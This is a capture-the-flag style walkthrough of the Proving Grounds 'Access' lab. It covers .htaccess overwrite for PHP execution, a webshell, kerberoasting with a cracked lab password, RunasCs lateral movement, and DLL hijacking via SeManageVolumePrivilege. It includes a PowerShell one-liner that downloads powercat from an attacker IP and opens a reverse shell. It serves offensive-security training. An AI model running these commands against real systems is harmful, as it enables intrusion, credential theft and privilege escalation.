---
title: PG-Access
published: 2025-05-29
toc: true
draft: false
tags:
  - "dll-hijacking"
  - "FileUploadAttacks"
  - "kerberoasting"
  - "SeManageVolumePrivilege"
  - "OSCP Prep"
---

```
Scope:
192.168.102.187
```

# Recon
## Nmap

```bash
sudo nmap -sC -sV access -sT -vvvv -p- -Pn -T5 --min-rate=5000

PORT      STATE SERVICE       REASON  VERSION
53/tcp    open  domain        syn-ack Simple DNS Plus
80/tcp    open  http          syn-ack Apache httpd 2.4.48 ((Win64) OpenSSL/1.1.1k PHP/8.0.7)
|_http-favicon: Unknown favicon MD5: FED84E16B6CCFE88EE7FFAAE5DFEFD34
|_http-title: Access The Event
|_http-server-header: Apache/2.4.48 (Win64) OpenSSL/1.1.1k PHP/8.0.7
| http-methods: 
|   Supported Methods: POST OPTIONS HEAD GET TRACE
|_  Potentially risky methods: TRACE
88/tcp    open  kerberos-sec  syn-ack Microsoft Windows Kerberos (server time: 2025-05-19 08:13:45Z)
135/tcp   open  msrpc         syn-ack Microsoft Windows RPC
139/tcp   open  netbios-ssn   syn-ack Microsoft Windows netbios-ssn
389/tcp   open  ldap          syn-ack Microsoft Windows Active Directory LDAP (Domain: access.offsec0., Site: Default-First-Site-Name)
443/tcp   open  ssl/http      syn-ack Apache httpd 2.4.48 (OpenSSL/1.1.1k PHP/8.0.7)
445/tcp   open  microsoft-ds? syn-ack
464/tcp   open  kpasswd5?     syn-ack
593/tcp   open  ncacn_http    syn-ack Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped    syn-ack
3268/tcp  open  ldap          syn-ack Microsoft Windows Active Directory LDAP (Domain: access.offsec0., Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped    syn-ack
5985/tcp  open  http          syn-ack Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
9389/tcp  open  mc-nmf        syn-ack .NET Message Framing
47001/tcp open  http          syn-ack Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
49664/tcp open  msrpc         syn-ack Microsoft Windows RPC
49665/tcp open  msrpc         syn-ack Microsoft Windows RPC
49666/tcp open  msrpc         syn-ack Microsoft Windows RPC
49668/tcp open  msrpc         syn-ack Microsoft Windows RPC
49669/tcp open  msrpc         syn-ack Microsoft Windows RPC
49670/tcp open  ncacn_http    syn-ack Microsoft Windows RPC over HTTP 1.0
49671/tcp open  msrpc         syn-ack Microsoft Windows RPC
49674/tcp open  msrpc         syn-ack Microsoft Windows RPC
49679/tcp open  msrpc         syn-ack Microsoft Windows RPC
49701/tcp open  msrpc         syn-ack Microsoft Windows RPC
Service Info: Hosts: SERVER, www.example.com; OS: Windows; CPE: cpe:/o:microsoft:windows
```

## 80/TCP - HTTP

![](attachments/2b146d842f17a7b1ea0d084e8c67264a.png)

![](attachments/b70147542ca0ac166c802b2a1329c05d.png)

I went ahead and used `username-anarchy` to create a username list out of them and tried to use `kerbrute` to enumerate users:

![](attachments/fbc2c713a6af6a99590033d22b098717.png)

Unfortunate no matches.

![](attachments/f2ecd568286f38e1d3ca4c61b0235100.png)

This form doesn't work, so we don't have to keep testing it.

I inspect the site a bit more and find this.

![](attachments/c775b28769a78553dc423dab100c4cec.png)

This could be a **File Upload** attack.

![](attachments/b30f67f592f6a44721d72c8b83611af7.png)

This could however also be a **Reflected XSS** on second thought?

## File Upload Attack

![](attachments/81ff771808875c57bfe1a8fb20887d1e.png)

This is the script that we get upon submit.

![](attachments/a4a30bb5b50920e9e68ccf8715d1a20d.png)

Let's get to testing.

![](attachments/bafe49630fd5976a2710f5b1c7b3c162.png)

Let's try it out by adding a XSS comment inside the picture instead.

![](attachments/8f5d34a1c3296840e956d76147a97362.png)

![](attachments/b7925e7048e89106f6bc87fd2591ce48.png)

The payload does not get triggered however confirming that XSS is not the way.

Seems like we're left with the file upload attack.

Using `gobuster` I was able to find the `/uploads` endpoint:

![](attachments/7867ff62cf02a338889fbdbdb9876955.png)

We find our uploaded file here, let's try to upload a malicious webshell.

Using `burp` I intercept the request:

![](attachments/871561bcdc020be5d69172ad8cb8b2a9.png)

And here I will try to add my malicious webshell.

![](attachments/8486f623fd37cbc7816fea788eee3262.png)

![](attachments/050a265f906266eff0eb62fd330973a1.png)

I turned it around:

![](attachments/72b13ad90d7a6700b3e2a8bf4127794b.png)

![](attachments/e9ed0c3f595bd759cd63e53f60d0bf82.png)

![](attachments/f142a216188b961f8ebacd4af12e24f0.png)

After multiple tries I still got the following:

![](attachments/9d91e39758bae5efda352c3240f8ecf7.png)

### Overwriting .htaccess 

Frustrated I started my further enumeration online, thinking I hit a dead end.

I then found out I was on the correct path but I just had to do something I had never done before:

![](attachments/328ef1016daaedae44d409f38430c208.png)

Apparently we can try and overwrite the `.htaccess` file by uploading our own which will then allow us to upload a `php` web or reverse shell.

```bash
echo "AddType application/x-httpd-php .pwn" > .htaccess
```

:::info
We create a new file type which we will allow via the `.htaccess` file, we should then be able to upload the file and treat it as an `php` file
:::

![](attachments/a5a4f0e7fe2a225589af8315dcfe5730.png)

![](attachments/c40841ff9eacd075b391cdb58ad41266.png)

![](attachments/688cf1d4770fd05b422ecb4873f5b470.png)

# Foothold
## Shell as svc_apache

We boot up a listener before uploading the file.

![](attachments/71f39858800d4e6b5c70d0380be716fb.png)

:::fail
Unfortunately `penelope` didn't like this:
![](attachments/68e201d87fcb82c97d6f0522bf059692.png)
:::

![](attachments/4f8684115e4f9ea8fd61f1814b483d49.png)

Since we're a `svc` account I crossed my fingers hoping we have the `SeImpersonatePrivilege` enabled.

:::fail
[](attachments/0a5a66cdbffe6b8a089ff29014a466ae.png)
Wuap wuap....
:::

I instantly start my enumeration:

![](attachments/86b6036998911e573281b3c405d923dd.png)

Seems there's another service account, *svc_mssql*. This LIKELY means we'll have to do some lateral movement before getting Admin privs.

## Lateral Movement

I check the handy cheatsheet:

![](attachments/b9ff353a5ec1171f34a169720ca49f24.png)

We probably need to kerberoast here.

![](attachments/3ac93548b6b14e4af6128bc9b700c715.png)

Let's transfer over `rubeus` and get to work!

### Kerberoasting

![](attachments/2f4bd595bbd1d1e5174a585264d7d330.png)

![](attachments/ea37859ba8cd4f190eccf52dc78c3f8d.png)

Nice and easy, let's try and crack it.

![](attachments/b9f29f09dcf44c3d9b5f1d1156c3d4c8.png)

:::success
`john` cracks it INSTANTLY.
:::

```
svc_mssql
trustno1
```

### Password Spray

![](attachments/76dc0fbc74586f138fa48ed248a2cca7.png)

However it looks like we can't get access to `winrm`:

![](attachments/f1592015c28da48ac350c1f0839ced3a.png)

### RunasCs 

To circumvent this issue and get access as *svc_mssql* via our existing reverse shell we can use the following script:

![](attachments/32e6d5a04b39ea34f2a8dffd1b696a91.png)

![](attachments/b52f72d1b7aecc0f1cbf490733b1c83b.png)

Thus we have verified that we can execute commands as *svc_mssql*. We can now go ahead and create a reverse shell by uploading `powercat.ps1` in order to get a reverse shell as *svc_mssql*.

We will put the following line inside the `-Command` brackets:

```powershell
Powershell IEX(New-Object System.Net.WebClient).DownloadString('http://192.168.45.185/powercat.ps1');powercat -c 192.168.45.185 -p 443 -e cmd"
```

![](attachments/63ea22103e7dcebd4fe685c1e49967cf.png)

![](attachments/eb5a59f70420478f21abab36b677ae2c.png)

### local.txt

![](attachments/6718942627c479bb07be03e0f2cc363e.png)

# Privilege Escalation
## SeManageVolumePrivilege

![](attachments/5fbd9b126f1518845d76e764d0c5fb40.png)

Yet again no ez win?

![](attachments/b833874b9d8dca9c196638d633ba58e1.png)

Or isn't it?

![](attachments/b8de642f4607e52e1539d1382324b565.png)

Simply download and execute it:

![](attachments/f7cf60618d7b58b62c01702b46bbe08d.png)

Now we can write files to the `C:\` drive.

:::tip
Why is this useful you say? Well because there's a shit ton of DLL's inside the `/Windows/System32` folder which we can now hijack using our own crafter reverse shell!
:::

## DLL Hijacking

We will be using the `tzres.dll` file.

:::info
I could've used any `.dll` but was too lazy to do my research so I used a proven one.
:::

![](attachments/b7adee2106900f239127676e703a5432.png)

![](attachments/5ca2c5b22ca1e13db78d7e952b4b5945.png)

:::note
The good thing about hijacking this dll is that you can then call upon it by issuing `systeminfo`:
:::

![](attachments/9cd5424701d5e5e4b42e08215c7ab6d2.png)

Eventhough it says it failed it really didn't:

![](attachments/f2dc70c9cc8af3acc0ff36a1b89b1c77.png)

### proof.txt

![](attachments/23abb6fb6b0f81cfe5fb4f32a24b37e5.png)

---

